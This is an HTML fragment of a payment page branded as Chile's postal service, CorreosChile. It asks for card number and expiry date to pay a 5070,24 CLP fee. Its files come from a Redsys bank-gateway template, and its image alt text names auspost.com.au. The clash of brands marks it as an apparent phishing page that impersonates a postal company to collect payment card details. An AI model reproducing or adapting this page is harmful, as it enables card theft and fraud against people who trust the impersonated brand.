...
<link href="https://media-exp1.licdn.com/dms/image/C4E0BAQEcFdxprT29iA/company-logo_200_200/0/1602244149830?e=2159024400&v=beta&t=4R75uQTD0wQQ8XilvUGdkv8e_PpTTNTVxBcnWqhrfyM" type="image/ico" rel="shortcut icon">
<link href="https://media-exp1.licdn.com/dms/image/C4E0BAQEcFdxprT29iA/company-logo_200_200/0/1602244149830?e=2159024400&v=beta&t=4R75uQTD0wQQ8XilvUGdkv8e_PpTTNTVxBcnWqhrfyM" type="image/ico" rel="icon">
<title>CorreosChile</title>
...
<header id="header">
<div class="container">
<h1 style="display:none;">CorreosChile</h1>
...
<img alt="auspost.com.au" src="./Redsys_files/toto.png" onerror="this.src='/sis/graficos/logotipos/comunes/9999logo.png'"></div>
<div class="lang-wr">
<div class="left">
<p>
...
<p lngid="seleccioneMetodoPago" style="color: #146E82;" class="s-text">Introduzca sus datos de pago</p>
</li>
<li id="s-auth" class="step ">
<span class="num">2</span>
<p lngid="comprobacionAutenticacion" class="s-text">Verificación</p>
</li>
<li id="s-connect" class="step ">
<span class="num">3</span>
<p lngid="solicitandoAutorizacion" class="s-text">Solicitar una licencia</p>
</li>
<li id="s-result" class="step ">
<span class="num">4</span>
<p lngid="resultadoTransaccion" class="s-text">Resultado de la transacción</p>
</li>
</ol>
...
<h3 lngid="pagoConTarjeta" class="pagoConTarjeta">Datos de pago</h3>
</div>
...
<text lngid="tarjeta">Número de tarjeta:</text>
</div>
...
<div class="lineaPagoTarjeta">
<div class="detalleTarjeta">
<text lngid="caducidad">Fecha de caducidad:</text>
</div>
<div class="inputTarjeta">
<span style="float:left;" class="icon i-cal"></span><input style="margin-right: 5px;" id="cad1" name="Sis_Caducidad_Tarjeta_Mes" placeholder="Mes" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="mes" alt="Mes" title="Mes" autocomplete="off" pattern="[0-9]{2}" value="">&nbsp;
							<input id="cad2" name="Sis_Caducidad_Tarjeta_Anno" placeholder="Año" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="Año" title="Año" autocomplete="off" pattern="[0-9]{2}" value="">
<div style="display:none;" id="mmaa">&nbsp;(<span lngid="monthmonth" id="monthmonth" class="text">Mes</span>/
							<span lngid="yearyear" id="yearyear" class="text">Año</span>)</div>
</div>
</div>
<div class="lineaPagoTarjeta">
<div class="detalleTarjeta">
...
<br>
<input type="submit" class="btn btn-lg btn-block btn-success" style="margin-top:15px;background-color: #cc0000;
    color: #fff; " value="Confirmar">
</div></div>
</div>
...
<h3 class="datosDeLaOperacion" lngid="datosDeLaOperacion">Datos operativos:</h3>
</div>
...
<div class="price">
<div class="left">
<p lngid="importe"> Gastos:</p>
</div>
<div class="right">
<p style="text-decoration: underline;"> 5070,24 CLP</p>
</div>
<br class="clear-fix">
</div>
</div>
...
<tbody>
<tr><td lngid="terminal" class="text"></td><td class="numeric"></td>
</tr>
<tr id="filaNumeroPedido">
<td lngid="pedido" class="text">Empresa:</td><td class="numeric"><strong>CorreosChile</strong></td>
</tr>
...
<img src="./Redsys_files/mama.jpg" alt="auspost.com.au"></div>
<li>
...
<div class="copyright">
<center>
<text lngid="copyright"><strong>© 2021 Correos de chile. Todos los derechos reservados.</strong></text>
</center>
</div>
